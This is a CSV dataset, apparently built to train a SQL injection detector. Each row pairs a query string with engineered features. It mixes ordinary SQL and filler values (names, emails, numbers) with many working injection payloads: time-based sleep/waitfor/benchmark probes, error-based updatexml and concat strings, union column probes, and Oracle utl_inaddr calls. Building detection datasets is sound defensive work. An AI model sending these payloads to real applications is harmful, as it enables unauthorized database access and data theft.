,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
30317,select scientific ( s )  from term union all,0,0,2,0,0,8,0,0,0,0,0,33,0,0,1,3.784189633918261,5.062431490914847
26415,select * from most order by people,0,0,1,0,0,6,0,0,1,0,0,27,0,0,2,3.5263605246161616,4.621137163019105
26721,select * from headed,0,0,1,0,0,3,0,0,1,0,0,16,0,0,1,2.995732273553991,3.7638991627446954
16704,dan,0,0,0,0,0,0,0,0,0,0,0,3,0,0,0,1.0986122886681098,1.19230319601282
6010,1'  )   and sleep  (  5  )  #,1,0,5,0,0,7,0,1,0,0,0,8,2,0,0,3.367295829986474,4.357111686472804
14622,41953346n,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
12168,dangers9@paremoselalzheimer.az,0,0,2,0,0,0,0,0,0,0,0,27,1,0,0,3.4011973816621555,4.412867051146341
28489,"  update favorite set exchange =  'somewhere', city =  'case' where original =  aboard",4,0,8,0,0,13,0,0,0,0,0,61,0,0,0,4.454347296253507,6.2908506611672514
25826,select * from post order by swimming desc,0,0,1,0,0,7,0,0,1,0,0,33,0,0,2,3.713572066704308,4.939896154656966
26696,select vessels from of,0,0,0,0,0,3,0,0,0,0,0,19,0,0,1,3.091042453358316,3.9129887722739327
28067,"  select create,bottom from pretty where familiar = 'play' union select tower, opinion from go",2,0,5,0,0,14,0,0,0,0,0,74,0,0,2,4.543294782270004,6.463181585426342
13427,mong-tse,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
28722,"  select * from stood where running not in  ( 'important', 'final', 'bridge' )  ",6,0,11,0,0,14,0,1,1,0,0,52,0,0,1,4.382026634673881,6.152384767567401
9643,1'+  (  select 'mzee' where 5984  =  5984,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1,3.713572066704308,4.939896154656966
3223,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",4,0,34,0,0,47,0,2,2,0,0,108,35,1,4,5.613128106388071,8.72251930115459
29269," select * from buffalo order by lost asc, if desc",0,0,2,0,0,10,0,0,1,0,0,37,0,0,2,3.8918202981106265,5.251655965920898
8338,"-6431""   )    )    union all select 2358,2358,2358,2358,2358,2358,2358,2358,2358,2358#",0,1,14,0,0,6,0,0,1,0,0,14,44,0,1,4.454347296253507,6.2908506611672514
24168,select * from zero fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,32,1,0,3,3.737669618283368,4.981567234930947
27453,select avg ( journey ) from orange select sum ( farm ) ,0,0,4,0,0,12,0,0,0,0,0,39,0,0,4,4.007333185232471,5.458096843121287
18370,salavedra castelltort,0,0,0,0,0,1,0,0,0,0,0,20,0,0,0,3.044522437723423,3.839958531231341
10899,"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,16,1,0,24,0,1,3,0,0,43,21,0,2,4.890349128221754,7.157548893414895
18897,kingston@professionalhost.com.ag,0,0,3,0,0,0,0,0,0,0,0,29,0,0,0,3.4657359027997265,4.519779854678687
2616,"1%""   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,18,1,0,29,1,1,3,0,0,108,12,0,2,5.231108616854587,7.874673657545498
26309,select * from vowel  where soil = giving,0,0,2,0,0,7,0,0,1,0,0,30,0,0,1,3.688879454113936,4.897348914472564
4434,"-2743 union all select 6757,6757,6757,6757,6757,6757--",0,0,8,1,0,4,0,0,3,0,0,14,28,0,1,3.9889840465642745,5.42506920217274
17106,"calle rio piguea, 5,",0,0,2,0,0,3,0,0,0,0,0,14,1,0,0,2.995732273553991,3.7638991627446954
20497,select * from only where try = 'title'  or made = 'type',4,0,7,0,0,11,0,1,1,0,0,37,0,0,1,4.02535169073515,5.490616172199279
25405,select broken ( s )  from had union all,0,0,2,0,0,8,0,0,0,0,0,28,0,0,1,3.6635616461296463,4.853884482035236
29568,"  update species set frog =  'safe', city =  'movie' where flower =  scientist",4,0,8,0,0,13,0,0,0,0,0,53,0,0,0,4.356708826689592,6.104257869167092
5294,"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1,16,1,0,26,0,1,3,0,0,75,16,0,2,5.010635294096256,7.406597807788619
13967,23266,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
5012,"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",0,4,17,0,0,24,0,2,1,0,0,86,9,0,2,5.003946305945459,7.39263251475859
14295,86943454g,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
29242,select stuck ( s )  from development select though from upon,0,0,2,0,0,10,0,0,0,0,0,47,0,0,2,4.0943445622221,5.615932130190505
9050,1  )   where 9552  =  9552 and 1961  =  6333--,0,0,5,1,0,9,0,1,2,0,0,8,17,0,0,3.828641396489095,5.140218969441503
8575,"1'+  (  select lgkd where 7801  =  7801 and elt  (  4249  =  4249,7259   )    )   +'",2,0,11,0,0,16,0,1,2,0,0,21,21,0,1,4.430816798843313,6.245637257588747
8216,"1'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,17,1,0,22,0,1,3,0,0,71,9,0,2,4.897839799950911,7.1729298517346045
17113,bacio bonnin,0,0,0,0,0,1,0,0,0,0,0,11,0,0,0,2.4849066497880004,2.999482870035824
5133,"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",4,0,13,0,0,16,0,1,2,0,0,21,21,0,1,4.454347296253507,6.2908506611672514
3886,"1%""   )    )    union all select null,null,null,null,null,null,null--",0,1,12,1,0,6,1,0,2,7,0,42,1,7,1,4.23410650459726,5.873719016140452
331,select * from users where id  =  1 <@. or 1  =  1 -- 1,0,0,8,1,0,14,0,1,3,0,0,24,4,0,1,3.9889840465642745,5.42506920217274
5211,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",0,0,8,0,0,8,0,0,1,0,0,19,36,0,1,4.290459441148391,5.97916802637938
7409,-9389'  )   or 8859  =  3989--,1,0,6,1,0,5,0,1,3,0,0,2,12,0,0,3.4011973816621555,4.412867051146341
14963,cowper,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
3399,"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",0,1,59,1,0,72,0,11,2,0,0,94,53,10,1,5.857933154483459,9.291408593243675
28369,select hospital from why,0,0,0,0,0,3,0,0,0,0,0,21,0,0,1,3.1780538303479458,4.05093304771096
4629,"-1337""  )   union all select 7508--",0,1,5,1,0,5,0,0,3,0,0,14,8,0,1,3.555348061489413,4.669921102482963
2190,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",0,4,23,0,0,25,0,2,1,0,0,77,10,0,2,5.099866427824199,7.594214353263836
29378,select from ( s )  from duty,0,0,2,0,0,6,0,0,0,0,0,19,0,0,1,3.332204510175204,4.299691526222142
16656,gault-lovett@lunch.com.ga,0,0,4,0,0,0,0,0,1,0,0,21,0,0,0,3.218875824868201,4.116261188933881
10418,1  )   waitfor delay '0:0:5',2,0,5,0,0,4,0,0,0,0,0,12,4,0,0,3.332204510175204,4.299691526222142
10128,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",0,0,9,0,0,16,0,2,0,0,0,13,18,0,0,4.356708826689592,6.104257869167092
13321,pitcavag,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
13245,pari073l,0,0,0,0,0,0,0,0,0,0,0,5,3,0,0,2.079441541679836,2.432300417938136
3560,"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",0,1,7,1,0,11,0,0,3,0,0,18,13,0,1,4.07753744390572,5.5852871348767055
24032,"  select shape,bet from milk where grabbed = 'everyone' union select mathematics, voyage from torn",2,0,5,0,0,14,0,0,0,0,0,78,0,0,2,4.584967478670572,6.544698632292425
4080,"iif  (  4638  =  8258,1,1/0  )  ",0,0,6,0,0,6,0,0,1,0,0,3,11,0,0,3.4657359027997265,4.519779854678687
10854,"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ogwd' like 'ogwd",4,0,22,0,0,36,0,2,1,0,0,123,12,0,2,5.429345628954441,8.308691449703643
3406,"1%"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,16,1,0,27,1,1,3,0,0,108,12,0,2,5.1647859739235145,7.732268544144516
3758,"-3445 union all select 5505,5505,5505--",0,0,5,1,0,4,0,0,3,0,0,14,16,0,1,3.6635616461296463,4.853884482035236
29706,select * from over where market between 'exact' and 'specific',4,0,5,0,0,9,0,1,1,0,0,48,0,0,1,4.127134385045092,5.675937336868984
13033,rayadillo,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
24836,select * from simply where settle = 'another'  and city = 'nation',4,0,7,0,0,11,0,1,1,0,0,47,0,0,1,4.189654742026425,5.791153910047609
28973,select * from tribe order by river,0,0,1,0,0,6,0,0,1,0,0,27,0,0,2,3.5263605246161616,4.621137163019105
11735,37110,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
21848,"  select appleid as id, symbol as ride from stood",0,0,1,0,0,9,0,0,0,0,0,38,0,0,1,3.8918202981106265,5.251655965920898
1594,-4557 or 6872  =  6872-- kkte,0,0,4,1,0,5,0,1,3,0,0,6,12,0,0,3.367295829986474,4.357111686472804
27190,select count ( * )  as applied,0,0,3,0,0,6,0,0,1,0,0,20,0,0,2,3.4011973816621555,4.412867051146341
20951,select * from feed where date between direction09/01/1996breathe and grain15/31/1996jar,0,0,5,0,0,9,0,1,5,0,0,57,16,0,1,4.465908118654584,6.313121924766899
3258,-6755  )   or 9323  =  9323#,0,0,4,0,0,5,0,1,1,0,0,2,12,0,0,3.332204510175204,4.299691526222142
28774,select * from speed where not wagon = 'throw'  and not distance = 'depth',4,0,7,0,0,13,0,2,1,0,0,52,0,0,1,4.290459441148391,5.97916802637938
4759,-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  ,1,0,42,0,0,54,0,7,1,0,0,53,36,6,1,5.541263545158426,8.559367492058051
26649,select avg ( party ) from apart select sum ( dish ) ,0,0,4,0,0,12,0,0,0,0,0,36,0,0,4,3.951243718581428,5.357417698153898
24274,select min ( food )  as source from both,0,0,2,0,0,8,0,0,0,0,0,29,0,0,1,3.688879454113936,4.897348914472564
13771,brando@elsentidodelavida.lc,0,0,2,0,0,0,0,0,0,0,0,25,0,0,0,3.295836866004329,4.240494654101009
17582,melanson,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
11899,isasi urquiza,0,0,0,0,0,1,0,0,0,0,0,12,0,0,0,2.5649493574615367,3.1155015354702966
12321,5urgui8a,0,0,0,0,0,0,0,0,0,0,0,6,2,0,0,2.079441541679836,2.432300417938136
11083,"1   )    )     )   union all select null,null,null,null#",0,0,7,0,0,7,0,0,0,4,0,30,1,4,1,4.02535169073515,5.490616172199279
645," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",0,0,8,1,0,16,0,0,3,0,0,40,4,0,2,4.330733340286331,6.055066595411042
658," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",0,0,11,1,0,15,0,1,3,0,0,40,3,0,2,4.343805421853684,6.0797984693327525
24709,"   select wear,stone,whom,sat,first     (  (  higher join ice on sound.aware =  difference.halfway )   inner join callon orders.force =  structure.taxid ) ",0,0,14,0,0,20,0,0,0,0,0,109,0,0,3,5.043425116919247,7.4752555247670145
9125,-2505' or 9323  =  9323#,1,0,4,0,0,4,0,1,1,0,0,2,12,0,0,3.1780538303479458,4.05093304771096
16194,franklin,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
417," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  6   )    )    and 'i'  =  'i",3,0,25,0,0,35,0,2,0,0,0,120,2,0,2,5.384495062789089,8.209386109454032
30002,select * from flat where drop between pale09/01/1996weigh and began15/31/1996known,0,0,5,0,0,9,0,1,5,0,0,52,16,0,1,4.406719247264253,6.199496085735905
22061,select expect ( s )  from value select breakfast from entire,0,0,2,0,0,10,0,0,0,0,0,47,0,0,2,4.0943445622221,5.615932130190505
12637,rist,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
7063,"-7036%' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  ",1,0,42,0,0,53,1,8,1,0,0,71,40,7,1,5.541263545158426,8.559367492058051
1366,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,0,0,7,0,0,19,0,0,0,0,1,31,13,0,1,4.48863636973214,6.357017110069445
3357,"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,0,4,40,0,0,44,2,5,0,1,0,56,27,6,0,5.424950017481403,8.298929993434133
11047,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'wvzb'  =  'wvzb,6,0,15,0,0,13,0,1,0,0,0,23,4,0,0,4.3694478524670215,6.128451232979604
11660,estolano boget,0,0,0,0,0,1,0,0,0,0,0,13,0,0,0,2.6390573296152584,3.2241419783899143
22789,select curious ( s )  from pencil,0,0,2,0,0,6,0,0,0,0,0,24,0,0,1,3.49650756146648,4.571113592379885
11115,1'+  (  select 'ncny' where 5634  =  5634,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1,3.713572066704308,4.939896154656966
12833,91704360w,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
21630,select count ( wood ) from proper,0,0,2,0,0,6,0,0,0,0,0,25,0,0,2,3.49650756146648,4.571113592379885
6912,"1%'  )   union all select null,null,null,null,null,null,null,null--",1,0,12,1,0,5,1,0,2,8,0,46,1,8,1,4.204692619390966,5.819025031871101
18630,qu.8ncen3rio,0,0,1,0,0,0,0,0,0,0,0,9,2,0,0,2.4849066497880004,2.999482870035824
27561,"   select shine,further,well,decide,older     (  (  curious join dried on definition.product =  during.mice )   inner join motheron orders.east =  slabs.jarid ) ",0,0,14,0,0,20,0,0,0,0,0,115,0,0,3,5.081404364984463,7.555194009775804
7668,"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||",0,1,43,0,0,51,1,8,1,0,0,76,36,6,1,5.541263545158426,8.559367492058051
17689,5106,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
28556,select kind from avoid union select hurt from fastened order by fort,0,0,0,0,0,11,0,0,0,0,0,57,0,0,3,4.219507705176107,5.846543550882007
25856,select top 3 * from respect where accurate = 'bigger' select * from explanation,2,0,5,0,0,13,0,0,2,0,0,60,1,0,3,4.3694478524670215,6.128451232979604
19169,com/is?-wzx-uhylezkniylvabkl3w4oh5f749nr2kumffjzou  <email_address>  <![cdata[elwoodbuckley@freenet,0,0,12,0,0,2,0,1,3,0,0,76,7,0,0,4.59511985013459,6.564633716663423
13497,mccarthy.darcy@tantomontamontatanto.jo,0,0,3,0,0,0,0,0,0,0,0,35,0,0,0,3.6375861597263857,4.809458789423759
6003,"-1766""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (",0,1,35,0,0,54,0,1,7,0,0,61,35,8,1,5.541263545158426,8.559367492058051
17746,wardle,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
16287,co*marca,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
27273,select ask ( s )  from official union,0,0,2,0,0,7,0,0,0,0,0,27,0,0,1,3.610917912644224,4.764024421755989
26009,select count ( * )  as stepped,0,0,3,0,0,6,0,0,1,0,0,20,0,0,2,3.4011973816621555,4.412867051146341
28816,select avg ( safety ) from able,0,0,2,0,0,6,0,0,0,0,0,23,0,0,2,3.4339872044851463,4.467059038127735
2402,1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,0,0,5,0,0,12,0,1,0,0,0,14,17,0,0,4.0943445622221,5.615932130190505
25799,select met ( s )  from would select last ( s ) ,0,0,4,0,0,12,0,0,0,0,0,30,0,0,2,3.8501476017100575,5.178036175455065
12962,07608453f,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18765,clipsham5,0,0,0,0,0,0,0,0,0,0,0,8,1,0,0,2.19722457733622,2.593591245490939
20049,"  select timediff ( ""2017-06-25 13:10:11"", ""2017-06-15 13:10:10"" ) ;",0,4,16,0,0,9,0,0,4,0,0,14,28,0,1,4.219507705176107,5.846543550882007
8018,-3750'+  (  select alpu where 3911  =  3911 order by 1--,1,0,7,1,0,10,0,0,4,0,0,22,13,0,2,4.02535169073515,5.490616172199279
14005,mango_rizzo1@premiostv.ky,0,0,3,0,0,0,0,0,0,0,0,21,1,0,0,3.218875824868201,4.116261188933881
6722,1  )   as nwfz where 7365  =  7365 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,0,58,1,0,74,0,11,2,0,0,100,53,10,1,5.877735781779639,9.33832814304258
24710,select offer ( s )  from speak left join,0,0,2,0,0,8,0,0,0,0,0,29,0,0,2,3.688879454113936,4.897348914472564
15765,41910864b,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
18476,ansaldo,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
28005,select * from general 3,0,0,1,0,0,4,0,0,1,0,0,17,1,0,1,3.1354942159291497,3.983240309714999
20366,"  select complete as middle, welcome as [consist]  from terrible",0,0,3,0,0,9,0,0,0,0,0,50,0,0,1,4.158883083359672,5.734313559436426
22851,select failed ( s )  from interior select characteristic from select,0,0,2,0,0,10,0,0,0,0,0,55,0,1,3,4.219507705176107,5.846543550882007
11771,847,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,1.0986122886681098,1.19230319601282
15990,9.61e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
25775,select * from born where price not between 10 and 20,0,0,1,0,0,10,0,2,1,0,0,37,4,0,1,3.951243718581428,5.357417698153898
13209,thirugna,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
29209,select * from pile where idea not like 'most%',2,0,4,0,0,8,1,1,1,0,0,34,0,0,1,3.828641396489095,5.140218969441503
8883,"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,0,4,11,0,0,11,2,2,0,0,0,10,2,0,0,3.8501476017100575,5.178036175455065
20901," select * from package order by headed asc, word desc",0,0,2,0,0,10,0,0,1,0,0,41,0,0,2,3.970291913552122,5.391515666300752
24246,select * from thirty where shine = 'remove'  or official = 'pure',4,0,7,0,0,11,0,1,1,0,0,46,0,0,1,4.174387269895637,5.762920220853171
13547,albero bajo,0,0,0,0,0,1,0,0,0,0,0,10,0,0,0,2.3978952727983707,2.8749024412290907
26944,select avg ( bill )  from either  select sum ( environment ) ,0,0,4,0,0,12,0,0,0,0,0,43,0,0,4,4.110873864173311,5.646144513813471
19886,select log ( 2 ) ;,0,0,3,0,0,5,0,0,0,0,0,9,1,0,1,2.8903717578961645,3.6015010896570807
9200,-1280'   )    )    or 8571  =  8571--,1,0,7,1,0,6,0,1,3,0,0,2,12,0,0,3.610917912644224,4.764024421755989
8375,1' where 7176  =  7176,1,0,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
18740,bekki,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
12448,5.22e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
4712,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  1773  =  1773",0,0,9,0,0,16,0,2,0,0,1,18,29,0,0,4.543294782270004,6.463181585426342
16395,egido s/n,0,0,1,0,0,1,0,0,1,0,0,7,0,0,0,2.19722457733622,2.593591245490939
3166,1' where 8099  =  8099,1,0,2,0,0,4,0,0,0,0,0,5,9,0,0,3.091042453358316,3.9129887722739327
25,insert,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
6428,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",0,1,28,0,0,35,0,4,0,1,0,53,27,6,0,5.181783550292085,7.768632789417219
21341,select * from arrive where time  between 10 and 20,0,0,1,0,0,9,0,1,1,0,0,35,4,0,1,3.912023005428146,5.287509109454676
5481,"1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh",4,0,26,0,0,29,0,2,0,0,1,44,39,0,1,5.214935757608986,7.839819880346576
